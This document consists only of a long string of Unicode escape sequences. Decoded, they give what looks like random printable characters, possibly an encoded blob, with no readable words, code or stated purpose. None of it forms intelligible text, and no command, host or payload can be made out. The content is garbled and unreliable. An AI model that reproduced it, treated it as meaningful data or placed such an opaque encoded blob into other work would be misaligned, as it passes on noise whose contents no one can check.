\u0057\u006d\u0021\u0060\u0061\u006c\u004d\u0050\u005a\u0067\u0074\u0039\u0049\u007b\u0029\u007c\u0067\u0030\u0079\u005a\u0020\u003c\u0050\u0042\u0079\u0045\u005d\u0032\u0052\u006d\u0042\u0054\u005d\u007a\u0065\u006c\u0067\u0058\u0073\u0042\u002e\u002a\u0069\u0043\u0062\u0070\u0039\u005a\u006f\u0020\u006a\u0050\u0045\u0040\u002f\u0077\u0073\u0039\u004d\u0054\u0049\u0041\u0021\u004f\u0063\u0039\u0043\u0027\u0055\u006c\u0076\u0063\u0059\u0036\u0062\u0027\u0061\u0058\u007c\u0022\u0054\u0075\u0030\u0041\u003d\u003d\u0027\u0020\u0033\u0057\u0040\u0053\u006f\u0034\u0074\u003e\u0020\u0060\u0052\u003a\u0039\u0076\u0051\u0043\u007a\u006c\u007e\u0074\u002d\u004d\u005d\u0026\u0041\u003b\u0027\u0073\u003b\u0075\u0064\u0034\u0038\u007b\u003a\u002c\u0052\u007a\u0079\u0077\u0060\u007a\u0033\u0048\u0033\u003a\u004a\u0079\u0050\u0063\u0069\u005b\u0076\u0034\u007c\u002f\u005b\u0061\u0056\u0045\u0021\u002b\u0038\u0025\u007b\u0076\u0028\u0054\u005a\u0079\u0028\u0053\u005c\u0077\u0072\u007c\u0037\u002e\u006c\u006b\u005d\u0047\u0070\u0070\u003b\u0079\u005b\u0074\u007b\u0047\u0068\u0079\u007b\u0074\u0071\u0034\u005a\u0067\u0065\u0058\u007e\u007d\u0039\u004f\u002a\u0068\u0045\u002f\u004d\u0034\u007d\u0055\u0055\u004c\u006f\u0021\u0057\u0074\u002c\u0045\u0056\u0025\u0042\u0035\u003e\u004d\u006e\u004b\u0031\u0049\u0065\u0057\u002c\u0050\u0063\u006c\u006a\u004b\u005b\u004d\u0074\u0073\u0046\u0070\u002e\u006a\u0050\u0027\u0044\u0049\u0057\u0036\u0053\u0023\u006e\u0073\u0065\u0033\u0031\u0079\u0067\u0036\u005e\u0065\u003f\u0055\u0075\u0040\u0038\u0046\u005c\u005a\u0077\u004f\u002d\u003c\u0045\u005a\u007c\u0036\u0053\u0076\u0066\u002a\u0033\u004e\u0040\u002e\u002e\u0074\u003f\u0044\u007a\u003a\u0076\u005c\u003a\u0057\u0067\u0035\u0058\u0072\u0051\u0034\u0056\u004c\u0037\u0045\u0045\u004f\u0033\u0079\u005a\u0021\u002b\u0060\u002c\u005f\u0078\u0037\u0077\u0060\u0062\u0045\u005f\u0063\u003a\u0068\u0070\u0077\u004d\u0067\u0043\u0032\u006e\u0047\u007e\u005f\u0041\u0066\u0029\u0069\u0031\u0022\u0076\u002d\u0048\u003e\u0031\u0045\u0031\u0055\u0052\u0066\u0053\u002f\u0020\u003b\u0069\u0054\u004c\u0038\u003d\u006c\u0050\u005b\u0029\u0047\u0032\u005c\u0077\u007d\u002d\u0057\u0031\u0025\u007a\u0059\u0036\u005a\u006b\u002d\u0037\u0058\u005f\u0060\u003d\u0035\u0076\u0031\u004a\u0079\u0061\u004b\u0036\u004b\u006d\u0049\u005c\u003b\u0043\u0056\u0031\u004a\u0071\u005b\u0051\u004b\u0037\u0035\u0021\u002e\u0044\u0049\u0077\u0049\u0040\u006a\u002e\u0046\u0065\u005d\u005a\u003b\u0032\u0024\u0075\u0070\u006b\u004a\u0049\u007d\u0068\u006e\u0069\u0047\u006a\u0044\u005b\u0078\u0032\u0054\u0027\u002a\u0077\u002a\u0074\u002b\u0061\u003b\u003b\u0056\u003e\u0079\u0029\u0066\u006c\u0048\u006e\u0035\u0055\u005a\u0059\u002d\u0041\u0033\u0050\u0058\u0069\u002d\u0059\u0042\u0037\u004c\u0044\u002b\u0049\u0059\u0075\u003c\u006f\u0021\u0021\u0079\u006c\u003f\u0063\u007e\u0053\u0026\u003e\u0073\u006f\u0051\u006c\u0038\u0065\u007b\u0066\u0077\u007a\u0069\u0031\u005d\u0065\u006d\u0026\u0065\u0036\u0063\u0073\u005d\u0039\u0036\u0036\u003c\u0044\u0067\u0058\u005e\u0073\u0060\u0046\u0052\u007a\u0054\u0061\u005e\u007a\u0054\u0056\u006e\u0041\u006b\u0049\u0034\u0074\u0061\u005e\u0032\u0039\u0044\u0051\u0058\u0033\u0038\u007e\u006d\u0047\u0033\u007d\u0066\u0068\u002e\u005f\u002a\u003f\u006e\u0044\u0070\u0034\u0021\u0035\u0032\u0021\u0051\u0060\u003b\u002b\u0034\u0047\u004b\u0058\u007e\u006b\u0025\u0074\u0056\u0024\u007c\u0071\u0035\u006b\u0072\u0064\u0036\u0064\u0068\u0058\u0029\u0048\u0021\u0031\u007d\u0027\u006c\u006d\u0023\u0053\u0026\u0058\u0079\u0077\u0025\u0053\u0065\u0022\u0029\u0071\u006e\u002e\u0050\u0058\u006b\u005e\u0074\u0050\u0042\u002f\u0073\u0062\u005b\u0074\u002c\u002e\u003e\u005c\u003a\u0039\u0056\u0033\u0039\u0026\u005c\u003b\u0049\u0036\u002d\u005a\u0053\u0038\u0053\u0071\u0045\u002d\u003b\u0041\u002c\u0023\u0078\u0045\u0079\u0043\u004b\u002d\u0057\u0028\u0024\u0063\u0033\u0070\u007b\u004f\u002d\u0056\u005a\u0028\u0077\u0062\u005d\u002a\u0062\u003d\u007d\u0059\u0054\u0044\u0030\u002f\u002e\u0030\u0075\u0067\u0046\u0021\u0060\u006c\u004f\u0049\u0049\u005c\u005d\u005e\u0029\u0036\u0077\u0053\u0040\u0034\u004b\u003b\u0029\u005e\u0020\u0030\u004b\u0032\u0071\u0046\u002f\u003e\u0071\u0056\u0067\u0037\u005c\u005a\u0065\u002e\u0076\u003e\u0033\u0061\u0058\u005e\u0041\u003a\u005d\u0037\u0031\u0042\u002a\u0061\u0074\u007a\u006c\u0029\u006d\u0079\u0063\u0032\u0043\u0079\u0038\u004e\u0063\u0038\u0040\u0070\u0068\u0023\u003f\u0040\u0023\u0040\u003b\u0022\u002a\u0053\u0020\u0079\u0049\u0038\u0031\u0064\u003b\u0071\u0049\u0022\u0040\u0046\u007d\u004a\u0071\u005a\u007a\u0076\u0036\u0042\u0056\u0050\u0058\u0068\u0036\u004c\u0065\u0049\u0034\u0050\u0074\u0065\u0022\u0077\u002e\u0029\u0064\u002f\u0049\u004a\u0033\u004c\u005b\u0041\u002a\u004f\u005a\u005d\u0079\u0073\u0022\u004e\u0029\u006e\u006a\u002c\u003a\u0036\u0057\u007a\u007b\u0020\u004f\u006d\u003a\u0045\u007c\u0069\u005c\u0027\u0025\u0058\u007d\u006b\u0040\u0025\u0038\u0068\u0038\u007c\u003b\u004d\u003d\u0047\u0021\u0053\u003e\u005e\u0068\u003c\u0066\u0048\u004d\u0061\u005a\u0041\u005d\u0037\u0026\u0065\u0033\u0024\u0040\u006a\u003e\u0032\u002b\u0036\u0074\u0056\u0058\u005f\u007b\u002d\u0079\u0057\u002e\u0040\u006f\u0072\u0066\u0061\u006a\u0074\u0068\u0034\u0027\u0038\u005d\u0061\u0026\u0023\u0032\u0046\u0032\u006e\u0072\u0055\u0049\u0078\u002f\u006d\u0059\u005d\u0038\u007d\u0033\u002c\u007c\u004f\u0022\u0065\u0026\u0026\u002f\u004a\u0023\u003d\u004a\u0058\u0070\u0020\u0074\u0078\u0066\u0032\u0056\u004d\u0069\u0078\u0021\u005c\u007c\u005f\u003d\u0035\u0063\u0062\u0056\u0045\u0059\u003c\u0034\u003a\u006f\u0064\u0075\u006a\u0066\u0066\u0041\u0048\u0024\u0038\u0076\u0043\u006b\u0077\u0036\u0071\u004d\u0020\u007d\u0071\u002c\u006c\u005a\u0063\u0023\u004f\u0071\u0065\u003a\u0026\u0068\u0067\u0074\u0047\u002f\u0033\u0056\u0049\u0054\u0025\u0062\u0044\u003a\u0026\u0034\u004f\u0020\u0055\u0036\u002a\u006a\u0067\u0031\u007d\u0079\u0075\u0076\u004a\u0061\u004b\u0063\u0029\u005e\u0069\u002b\u0027\u0024\u0027\u0021\u0026\u0075\u0075\u0058\u0024\u006c\u0047\u004e\u0032\u0072\u002c\u0044\u005a\u0035\u003a\u0046\u005f\u0067\u0074\u004e\u0047\u0056\u003a\u0073\u0028\u0061\u0057\u0034\u002e\u0043\u0022\u0057\u0048\u0077\u007e\u0047\u0063\u0034\u0074\u006d\u0079\u0064\u0035\u0034\u0022\u007c\u0052\u0057\u005d\u005b\u0020\u007d\u0043\u0062\u006e\u0061\u0034\u0029\u006e\u0036\u0050\u005d\u002f\u006d\u005d\u004e\u002c\u0042\u0029\u007e\u0032\u0051\u004e\u0066\u002d\u0027\u0072\u007a\u002a\u007e\u003e\u0055\u0066\u0078\u0042\u0046\u004f\u005f\u0069\u007a\u007b\u0053\u003b\u004c\u004b\u0031\u005b\u003f\u003c\u0064\u0050\u0022\u0024\u0052\u0059\u0072\u0023\u0024\u004a\u0070\u0020\u003a\u0043\u007b\u0079\u005d\u0041\u005a\u002e\u0047\u0040\u0032\u004a\u0024\u002f\u005c\u0063\u0077\u002a\u004a\u002d\u0046\u0034\u0029\u0043\u003e\u0031\u0074\u007b\u0063\u006b\u0029\u004a\u0063\u0057\u004b\u0042\u003a\u0066\u0076\u0030\u0057\u0065\u007a\u004d\u0060\u003e\u0021\u0027\u0024\u007d\u0060\u0070\u007b\u0051\u0074\u0061\u007b\u003f\u0078\u0021\u007e\u0026\u0054\u0022\u007d\u0076\u0044\u0076\u0070\u0048\u005b\u0041\u003a\u006f\u0073\u0060\u0056\u0038\u005d\u0042\u003d\u0062\u0055\u0032\u0077\u006d\u006d\u0078\u0036\u0035\u0050\u007d\u0059\u0023\u0079\u0020\u0044\u0027\u005c\u004f\u0028\u0034\u0078\u0027\u0074\u0054\u0060\u0028\u0065\u0042\u006e\u002d\u0037\u0037\u0025\u002d\u0076\u007b\u0042\u0031\u004b\u0051\u004b\u0028\u007d\u0040\u0060\u002a\u0052\u0048\u0065\u0062\u0027\u0049\u0053\u006c\u006d\u0068\u004e\u0076\u0028\u0047\u004c\u005f\u005b\u0067\u0070\u002f\u0071\u0027\u006b\u0060\u0078\u0027\u0075\u0069\u002f\u002f\u007d\u0032\u0079\u0059\u0035\u002e\u0031\u004f\u006e\u005d\u0041\u0030\u003b\u0021\u003b\u0020\u0059\u0023\u0065\u0055\u004e\u0030\u004a\u0038\u0065\u0051\u0075\u0066\u0056\u002d\u007e\u007e\u0042\u006d\u007a\u002e\u005d\u0059\u004e\u007d\u0052\u0026\u0027\u0079\u0021\u0043\u0033\u0023\u0042\u0063\u0066\u005a\u0064\u006d\u0074\u0033\u007d\u005e\u0062\u003f\u0040\u0071\u006b\u0027\u0024\u0071\u006f\u0074\u0054\u003a\u007c\u003e\u005a\u0034\u0030\u003b\u006d\u002b\u0053\u006e\u0067\u006e\u0024\u0039\u0057\u007c\u0024\u005c\u007d\u007a\u004c\u0074\u0021\u0028\u006e\u0058\u002c\u0034\u0034\u005e\u0034\u0020\u0036\u0032\u0071\u0044\u003e\u0050\u004a\u004f\u0054\u0025\u0056\u0066\u0079\u0077\u0069\u0037\u007d\u0067\u007e\u0030\u0057\u002f\u0033\u007c\u0033\u0058\u0061\u004f\u007b\u0031\u004a\u004e\u0022\u0063\u006b\u0060\u007c\u0066\u004b\u0059\u0040\u0030\u0041\u0034\u002b\u0064\u0054\u0067\u0062\u0049\u0058\u0057\u0059\u005a\u006c\u0057\u005a\u0061\u0051\u0071\u0026\u0020\u0034\u003a\u004d\u0052\u002c\u004c\u002e\u005d\u0068\u006b\u0065\u004e\u0054\u006a\u006d\u003f\u0043\u0038\u0032\u0045\u0052\u002e\u006f\u0034\u0060\u0070\u005c\u0033\u0024\u0079\u002d\u002c\u0061\u0050\u0035\u0047\u0057\u003f\u007c\u007d\u0069\u006a\u005a\u0064\u0052\u0033\u002c\u0023\u0044\u0060\u0060\u0027\u0031\u007d\u0033\u0025\u0059\u0031\u007b\u003b\u007c\u0029\u006f\u007c\u0023\u0028\u002b\u0051\u0064\u0038\u007c\u0035\u0059\u0027\u0050\u002a\u0057\u003b\u002d\u006b\u005c\u0068\u005e\u0029\u005b\u0041\u0039\u006d\u0041\u005d\u0071\u007c\u0030\u0029\u006e\u004e\u003d\u0075\u006c\u0052\u0076\u002a\u0029\u002d\u0050\u003d\u004f\u0054\u003f\u006f\u005a\u004d\u003f\u0074\u0026\u006d\u0045\u004d\u0069\u0072\u0057\u002d\u0070\u0020\u006a\u003a\u0056\u0042\u0034\u0039\u0052\u0044\u0036\u0036\u006e\u002e\u0030\u007c\u0031\u0062\u0041\u0049\u0059\u0057\u0049\u004f\u0049\u007d\u0030\u005e\u0025\u0070\u0048\u006f\u007b\u005d\u0074\u0064\u0040\u0034\u0079\u0047\u005b\u0029\u0044\u0075\u0049\u0049\u0021\u005a\u0043\u0057\u006d\u0055\u0035\u0076\u0020\u0023\u006f\u0022\u0052\u0053\u004e\u0028\u006c\u0044\u0068\u007c\u0053\u003f\u006b\u0038\u0031\u0049\u0052\u002f\u007a\u0041\u0078\u0034\u004e\u0021\u0042\u0066\u0042\u004a\u007e\u0061\u002c\u002a\u0037\u0039\u0038\u0026\u0066\u0058\u002f\u007b\u004d\u002a\u0042\u0064\u0025\u002f\u0027\u004d\u0040\u006b\u002b\u005f\u0042\u0066\u0020\u0024\u0039\u0064\u003a\u002d\u0078\u005e\u006c\u005d\u0033\u0044\u004f\u0057\u003e\u0021\u0079\u0044\u003f\u0070\u0057\u0060\u0067\u0067\u0041\u0041\u0043\u004e\u0041\u0031\u002d\u005e\u0038\u0069\u0065\u0054\u0039\u0044\u0024\u005e\u002f\u0076\u004d\u002c\u003a\u0043\u005a\u0035\u005d\u0032\u004e\u0045\u0022\u0071\u007a\u0076\u002c\u0068\u0042\u0065\u0046\u006e\u002d\u0072\u0047\u003d\u0052\u0053\u0066\u0032\u004f\u003b\u0033\u0049\u0062\u0024\u0040\u0031\u002d\u0077\u007e\u0057\u0053\u003f\u0074\u006d\u006a\u0068\u004b\u0057\u007c\u0076\u0066\u0067\u0072\u0064\u006e\u003a\u002b\u0078\u0047\u0056\u0078\u0058\u0039\u0065\u0025\u0066\u006c\u0024\u0054\u0064\u0035\u0069\u006a\u0050\u0031\u002a\u0078\u0039\u007e\u002c\u0025\u0020\u0024\u007d\u0065\u006e\u0047\u0069\u0077\u005c\u0041\u005d\u002c\u0071\u006e\u003d\u0034\u0062\u007e\u002a\u0031\u0022\u0022\u003b\u0055\u0020\u004a\u006a\u0067\u007e\u0056\u006d\u0039\u003c\u006b\u0051\u0063\u002c\u0069\u0073\u0032\u0035\u007d\u0040\u0079\u0023\u0040\u0040\u0033\u003a\u007a\u0022\u0020\u006a\u0057\u0073\u0030\u0058\u004a\u007c\u0024\u006a\u005d\u004d\u0042\u0029\u005f\u005b\u002b\u0060\u004e\u0069\u0050\u0068\u0064\u0066\u0056\u005e\u005d\u0020\u0026\u0078\u0074\u004d\u0035\u005b\u0068\u005f\u0058\u007d\u007e\u006e\u002c\u006b\u007c\u0035\u002f\u002e\u0077\u004b\u0067\u0034\u006b\u0033\u003d\u0064\u0051\u0055\u006d\u0023\u0040\u007e\u0035\u006b\u006c\u0061\u0030\u0038\u0054\u0076\u0055\u0070\u0066\u005a\u0052\u0029\u003e\u0061\u0069\u0021\u0059\u0050\u0070\u0061\u0052\u0079\u0020\u0069\u005d\u0034\u0065\u0057\u0033\u0056\u002d\u004a\u007c\u0027\u003a\u006c\u0037\u0073\u0057\u007e\u0073\u006b\u0074\u0063\u004f\u0034\u0021\u0033\u0072\u0035\u006b\u0077\u005d\u0039\u0027\u005f\u0033\u004e\u0026\u0026\u005e\u002e\u0053\u0074\u0023\u0070\u002e\u006e\u0021\u004c\u005e\u0063\u0073\u005d\u0043\u005b\u0021\u0020\u0032\u0026\u0034\u007b\u0028\u004c\u0076\u0065\u0029\u0053\u0068\u007b\u0069\u004b\u002e\u007d\u0067\u0020\u004e\u0039\u007c\u0053\u005b\u004c\u007c\u004f\u0033\u0039\u007a\u0034\u002e\u0069\u005a\u0058\u0048\u0043\u007b\u005d\u004d\u0055\u0043\u0039\u0074\u0061\u0064\u005d\u0046\u003b\u007d\u006f\u004e\u007e\u007a\u0033\u0035\u0061\u005c\u0030\u0053\u0064\u004b\u006d\u006f\u0045\u0071\u0053\u0037\u0066\u0069\u007a\u0040\u0041\u0069\u0066\u0053\u002c\u007e\u0054\u0076\u0052\u0049\u006a\u0055\u0025\u0040\u0061\u0040\u0079\u002a\u007b\u0061\u0033\u0068\u0068\u002e\u003c\u0067\u0039\u0043\u006e\u0061\u0037\u007c\u0040\u0053\u0079\u0067\u006b\u006b\u0078\u003a\u0074\u0066\u0020\u0050\u005d\u005d\u0060\u0042\u0032\u0059\u0040\u007b\u003a\u004d\u0020\u005b\u007d\u0060\u0063\u0074\u002a\u004f\u007b\u0056\u006d\u006d\u002d\u0035\u0069\u002f\u0049\u004a\u0036\u0046\u0065\u0079\u0029\u005a\u0040\u007e\u0041\u002d\u0071\u007b\u0033\u0030\u0039\u0071\u002b\u0067\u007a\u0045\u0045\u002d\u0031\u0038\u0063\u0060\u0047\u0025\u004f\u003e\u0072\u0077\u0043\u0035\u0062\u007a\u0076\u0050\u0046\u0040\u007c\u004c\u006a\u0040\u003b\u004c\u003b\u0025\u0072\u004b\u0038\u006b\u0030\u002f\u004c\u0023\u0054\u0064\u002f\u005b\u0067\u007c\u004a\u0056\u0032\u0044\u006a\u004a\u002f\u0076\u0072\u0075\u0042\u006e\u0042\u0058\u0074\u004b\u0055\u0072\u006c\u0032\u0025\u0059\u0034\u0054\u0072\u0070\u0044\u002c\u0039\u0043\u0067\u0050\u0038\u0078\u002d\u0030\u007b\u005d\u007e\u003f\u002e\u0060\u003c\u004d\u0037\u0071\u003d\u0027\u0032\u0038\u0031\u002b\u0076\u0051\u0055\u004a\u0067\u0065\u0070\u006a\u003b\u0045\u0068\u0051\u006a\u0050\u003d\u005f\u0026\u0034\u0037\u0041\u0063\u004e\u0052\u004c\u0071\u0029\u002b\u0043\u002f\u0030\u0071\u0072\u002d\u0044\u0046\u0035\u0038\u005e\u005d\u002c\u0037\u0023\u0029\u003f\u0061\u0023\u0058\u0024\u0074\u0070\u0056\u004c\u0026\u0052\u0060\u0027\u005c\u0032\u004b\u0044\u0061\u0048\u003a\u0040\u0034\u0044\u0021\u0039\u0020\u003b\u006a\u005d\u0077\u0034\u0027\u0028\u0023\u005b\u006b\u0022\u0054\u0068\u0065\u0059\u003e\u0077\u0074\u004a\u0074\u006e\u0065\u0038\u007b\u007a\u002f\u0063\u0078\u0060\u003a\u0054\u0028\u005b\u0059\u0069\u005e\u0076\u0053\u0020\u0023\u002c\u0026\u0045\u007d\u0031\u0036\u007c\u0023\u0073\u0061\u005a\u007d\u0076\u0046\u002a\u0053\u0046\u0020\u0042\u0039\u007d\u004b\u0026\u004d\u0050\u005e\u0034\u0039\u004c\u0040\u0024\u007e\u0030\u006c\u0044\u0052\u0023\u0038\u003a\u0035\u0067\u0067\u003c\u0031\u0063\u0042\u0046\u0038\u002a\u0050\u0049\u003c\u003d\u002a\u0048\u004b\u0068\u007b\u0042\u003a\u0048\u0070\u0028\u0026\u0068\u0072\u003e\u003a\u0024\u0062\u0023\u0035\u0021\u0069\u0034\u0050\u0058\u0048\u0060\u007e\u006b\u002d\u0077\u0068\u003d\u0079\u0077\u005e\u004e\u0079\u0072\u002c\u0037\u0032\u0057\u0026\u0070\u0072\u0036\u0027\u002c\u0072\u004d\u0045\u0079\u004f\u0020\u0035\u0047\u0038\u0024\u0022\u0042\u0059\u007a\u0051\u0033\u005b\u0038\u0021\u0022\u0045\u0049\u002c\u0023\u002f\u0050\u004b\u003d\u0034\u0055\u0046\u0035\u0026\u0030\u005f\u006c\u0067\u0026\u0023\u0054\u005d\u0070\u0031\u0056\u0025\u0067\u007a\u007b\u0047\u005c\u005e\u0053\u003b\u0038\u0066\u005d\u007d\u0054\u0077\u005d\u0066\u0078\u0062\u005a\u0077\u0023\u006b\u0055\u0055\u0034\u0038\u0065\u006f\u0033\u0052\u005c\u0066\u002f\u0031\u003c\u0034\u0028\u0050\u0029\u003f\u0058\u0036\u0065\u005e\u0032\u003d\u0037\u0040\u0062\u005f\u0039\u0062\u0053\u0078\u0049\u0077\u007e\u0069\u005e\u0050\u0060\u003c\u0036\u0055\u0038\u002e\u003f\u0053\u006d\u007e\u0062\u0052\u006c\u0064\u003c\u0050\u0068\u0039\u0060\u0068\u004b\u005e\u0021\u0038\u0036\u0037\u003d\u0066\u003d\u0027\u0040\u0074\u0055\u007b\u005e\u0039\u0075\u0047\u0023\u0069\u0068\u0059\u0042\u0047\u0074\u006a\u0036\u0023\u0058\u0047\u0022\u0061\u002f\u003c\u0046\u0051\u004b\u006a\u0040\u0028\u002e\u0056\u0050\u0064\u0058\u0075\u007a\u0068\u0063\u004b\u0041\u0066\u002f\u0067\u0046\u002c\u0024\u002a\u0058\u0026\u0061\u0025\u002b\u0023\u006f\u002b\u005b\u0058\u0053\u0034\u0046\u0048\u0051\u003d\u006e\u004b\u005e\u007e\u0074\u0025\u006b\u005d\u002e\u002d\u0032\u005d\u0054\u0022\u0047\u0049\u0058\u0077\u007a\u007d\u005f\u0057\u0051\u0052\u002c\u005e\u0024\u004d\u002a\u006d\u0079\u0025\u0060\u0045\u007d\u0025\u0043\u003f\u0027\u005f\u003a\u005a\u0060\u0044\u0031\u003b\u002a\u0023\u004d\u005d\u005f\u0058\u0044\u0050\u004e\u0042\u0046\u0033\u0067\u004c\u003a\u0062\u0029\u0070\u002e\u003b\u0048\u006a\u0073\u0028\u0076\u002a\u003b\u006b\u003a\u0051\u0078\u0037\u0068\u002f\u006d\u006c\u0054\u0025\u0043\u004e\u0068\u0042\u0061\u005a\u004d\u0039\u0040\u0049\u007c\u0056\u0055\u002d\u006e\u0050\u002c\u006b\u0021\u0053\u0028\u0049\u0061\u0054\u003c\u0049\u007e\u005a\u0023\u004c\u0050\u006f\u004c\u0073\u0063\u0052\u0025\u0048\u006e\u0057\u0072\u002e\u0071\u0022\u0058\u0075\u002f\u0069\u0036\u0061\u0053\u0034\u0043\u005b\u0078\u0021\u0056\u0032\u0051\u0037\u002f\u0078\u0073\u0050\u0071\u0056\u006e\u0021\u005b\u006a\u0062\u0044\u0021\u004b\u0046\u0041\u0027\u0028\u0038\u0050\u0057\u0077\u004e\u005f\u007e\u0056\u0075\u0074\u0068\u003d\u0069\u0025\u0042\u007d\u0030\u0079\u0072\u006c\u0043\u0033\u0020\u0036\u0072\u0034\u0024\u006b\u004b\u0026\u004d\u002c\u006d\u004a\u0070\u005e\u0063\u003f\u0045\u007b\u002a\u0039\u003d\u0067\u005a\u007d\u0026\u0037\u0073\u0073\u0074\u0038\u0064\u002f\u0044\u0051\u0029\u0037\u0078\u002a\u0077\u002b\u004f\u0068\u0024\u005f\u0025\u005d\u0025\u0065\u0052\u006c\u005d\u004d\u0078\u0061\u002c\u006e\u0053\u003d\u0077\u006c\u0022\u003f\u005d\u007e\u0032\u0075\u0057\u004c\u0062\u0079\u0063\u006d\u0030\u0060\u007d\u002e\u004a\u004c\u004c\u004c\u0043\u0037\u002e\u0076\u0028\u0029\u0054\u0066\u0058\u005e\u0023\u0024\u0065\u0066\u003d\u0034\u0029\u0055\u007d\u0049\u0041\u007b\u0022\u0034\u0033\u0077\u0032\u005b\u0037\u007e\u0026\u0034\u002b\u005c\u0044\u0067\u004c\u003d\u005e\u007a\u0067\u0058\u0032\u004d\u0037\u002b\u0032\u0024\u0068\u0063\u006c\u0052\u0070\u0024\u0079\u002d\u005a\u0063\u0045\u005c\u005c\u0049\u0048\u0060\u0046\u0079\u0049\u0031\u0074\u003e\u0048\u0063\u0056\u004d\u0073\u005a\u006e\u0066\u006d\u0050\u004a\u0023\u0056\u004b\u003b\u003e\u002e\u0076\u0066\u0024\u0037\u0040\u003f\u0056\u0058\u0057\u0038\u003b\u0060\u0069\u002c\u0022\u0033\u0033\u0063\u0032\u002c\u0061\u0063\u002f\u006e\u005a\u0076\u0025\u0046\u007d\u0044\u0066\u006a\u0062\u0021\u0031\u0076\u002c\u003a\u002a\u0027\u0034\u005a\u004e\u006a\u006f\u0047\u0052\u006c\u0069\u0065\u003e\u003d\u006a\u0073\u0024\u002d\u004e\u0048\u0025\u0060\u0037\u0076\u0072\u006a\u007d\u0041\u002a\u002b\u002e\u003e\u0038\u0031\u0048\u005a\u0055\u002b\u0077\u002a\u0051\u002e\u0048\u0054\u0079\u006a\u003f\u003a\u007b\u006b\u003f\u004e\u0044\u002c\u0031\u006c\u0059\u0076\u0040\u0024\u0057\u0044\u007b\u006f\u004f\u0065\u006d\u003d\u005f\u0032\u0051\u0020\u002c\u002e\u0065\u0065\u0064\u006e\u006f\u005f\u0027\u0055\u0030\u007c\u004d\u004f\u0045\u007b\u002e\u0048\u0074\u003e\u002a\u0052\u0042\u0062\u0054\u0077\u0072\u0052\u0020\u0026\u0070\u003f\u0077\u007e\u0020\u0026\u004d\u0066\u0073\u0054\u0056\u0076\u0035\u0034\u004b\u007e\u0051\u006f\u0029\u0062\u007e\u005b\u0022\u0076\u002b\u0043\u0071\u0055\u0048\u006e\u0048\u0062\u006b\u004a\u0062\u0027\u0022\u005f\u0021\u006b\u0025\u0033\u0034\u0076\u0038\u006f\u0079\u005a\u007e\u0052\u0054\u0052\u005b\u004f\u002c\u005b\u002b\u0048\u004d\u005d\u0063\u002c\u0032\u0058\u0043\u0020\u003e\u0063\u0065\u004c\u0061\u007a\u0043\u005a\u0058\u002a\u0057\u002f\u0020\u0070\u005c\u006b\u0024\u0067\u0071\u003e\u0036\u0066\u002b\u0051\u0023\u0045\u0055\u006b\u004d\u0026\u0023\u0045\u0038\u0029\u0039\u006d\u0023\u007a\u0026\u0077\u0066\u0047\u0060\u0021\u004f\u0030\u002a\u006a\u0043\u0068\u0036\u0036\u0049\u0048\u0062\u0025\u0041\u002d\u0049\u005c\u0075\u0022\u005a\u0071\u003b\u0068\u0028\u003e\u0072\u0027\u002b\u0046\u006d\u0050\u006c\u0036\u005f\u005b\u0048\u0022\u0058\u002d\u004a\u005f\u0046\u005d\u004a\u0060\u0048\u0021\u0067\u004d\u0028\u007c\u0025\u0036\u0076\u003b\u006d\u0066\u0041\u0036\u0032\u0063\u0077\u0036\u003a\u0030\u007b\u0068\u0026\u0027\u0066\u007e\u003a\u006a\u0054\u0054\u0075\u003f\u0027\u0044\u0059\u007a\u006f\u003c\u003e\u0040\u006e\u0052\u002a\u0063\u005c\u0079\u0073\u005c\u007d\u003c\u0074\u0069\u0023\u0062\u0063\u005c\u002a\u007d\u0067\u0027\u005b\u0075\u003a\u0023\u0023\u0077\u006e\u0049\u0072\u0029\u005a\u007b\u003a\u004b\u002c\u005c\u0079\u002e\u0051\u0046\u0040\u005c\u0045\u005a\u0045\u0038\u0045\u003a\u0079\u006d\u006e\u006a\u0037\u0036\u0049\u007c\u0041\u0079\u007b\u007c\u0071\u0066\u0024\u0039\u007a\u0020\u0067\u005f\u0072\u006f\u0030\u0069\u006a\u0041\u0063\u0024\u0068\u002b\u0073\u006d\u003a\u0031\u0065\u0046\u007e\u003b\u007b\u003e\u0024\u0032\u0075\u003a\u003d\u0033\u002b\u003f\u006c\u003f\u0075\u0031\u0020\u0073\u006e\u0075\u0055\u0057\u0029\u006c\u0052\u006f\u0054\u0077\u0071\u0038\u0026\u0072\u0021\u007b\u006e\u0026\u0038\u0077\u0067\u0048\u0047\u0038\u0063\u0061\u0037\u0060\u006e\u0038\u0054\u0074\u0048\u0049\u0035\u0049\u003a\u006e\u0031\u004b\u0078\u0053\u0033\u004f\u006a\u0055\u005b\u004a\u0050\u0040\u0034\u0040\u0036\u0078\u004f\u0022\u006e\u007d\u0025\u0070\u0078\u0026\u003f\u0034\u0046\u0042\u007a\u0041\u003b\u004d\u0074\u0035\u003c\u003f\u002a\u0039\u0074\u0077\u002b\u002c\u006c\u007a\u0023\u006a\u0061\u0048\u0041\u0076\u002d\u0042\u0063\u002f\u0050\u0043\u0024\u0038\u0044\u005b\u0030\u0072\u0057\u0071\u0066\u006c\u003d\u0035\u002c\u002f\u004f\u0030\u003d\u0030\u0070\u0037\u003f\u0033\u0029\u0071\u002c\u003a\u004b\u0022\u0054\u0058\u0046\u005d\u002a\u006b\u0049\u002b\u0045\u0073\u002e\u0065\u002f\u0079\u0074\u002c\u0062\u0064\u005f\u0062\u005d\u0034\u0070\u0036\u003c\u0073\u003a\u0049\u0073\u007a\u0046\u002a\u0063\u003a\u0022\u0070\u003a\u0046\u0056\u0073\u006e\u003f\u004e\u007d\u0020\u0037\u0028\u0027\u0040\u0061\u0068\u0056\u0038\u0046\u0050\u0079\u0059\u0029\u004d\u006d\u0055\u0077\u002c\u0039\u004c\u003d\u0078\u002c\u005d\u0023\u0050\u004a\u0078\u0023\u0041\u003a\u0071\u007b\u004e\u004f\u0041\u0072\u006c\u0056\u0028\u005d\u0055\u0036\u007b\u0047\u0038\u0076\u0068\u0079\u0051\u0021\u0078\u003d\u006c\u0026\u0043\u007d\u002a\u0020\u0078\u0069\u0025\u0069\u005a\u006c\u005a\u0063\u0044\u0036\u0068\u0035\u0063\u0074\u0022\u0055\u006d\u0035\u006f\u0072\u0062\u0051\u003c\u0026\u0034\u0059\u0025\u0022\u0071\u0053\u004e\u006b\u002f\u006e\u0047\u005a\u0073\u0048\u0040\u0058\u005d\u003f\u005d\u003a\u0067\u0050\u0066\u0028\u0041\u002a\u0058\u004b\u002b\u007d\u0045\u004d\u004d\u0036\u0024\u002f\u0020\u0049\u0045\u0070\u006d\u005d\u0070\u0061\u0024\u0030\u005f\u0060\u0069\u0045\u0042\u0062\u005c\u0060\u002d\u0043\u0021\u0038\u0027\u0021\u0043\u006b\u0025\u0052\u003b\u0046\u0027\u0071